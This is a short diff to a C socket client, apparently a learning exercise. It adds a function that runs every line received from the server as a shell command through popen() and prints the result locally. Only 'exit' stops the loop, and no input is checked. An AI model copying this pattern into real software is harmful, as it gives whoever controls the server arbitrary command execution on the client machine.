@@ -73,6 +73,25 @@ int conectToServer(char *address, char *port) {
     return socket_file_descriptor;
 }
 
+void executeReceivedCommand(char command[MAXLINE + 1]) {
+    FILE *fp;
+    int status;
+    char path[MAXLINE];
+
+    fp = popen(command, "r");
+    if (fp == NULL) {
+        printf("Error while trying to execute command!!\n");
+    }
+
+    while (fgets(path, MAXLINE, fp) != NULL)
+        printf("%s", path);
+
+    status = pclose(fp);
+    if (status == -1) {
+        printf("Error while trying to close popen oppened stream!!\n");
+    }
+}
+
 void readCommandsFromServer(int socket_file_descriptor) {
     int n;
     char recvline[MAXLINE + 1];
@@ -85,6 +104,8 @@ void readCommandsFromServer(int socket_file_descriptor) {
             if(strcmp(recvline, "exit") == 0) {
                 printf("Finishing interaction with server\n");
                 break;
+            } else {
+                executeReceivedCommand(recvline);
             }
         } else {
             perror("read error");
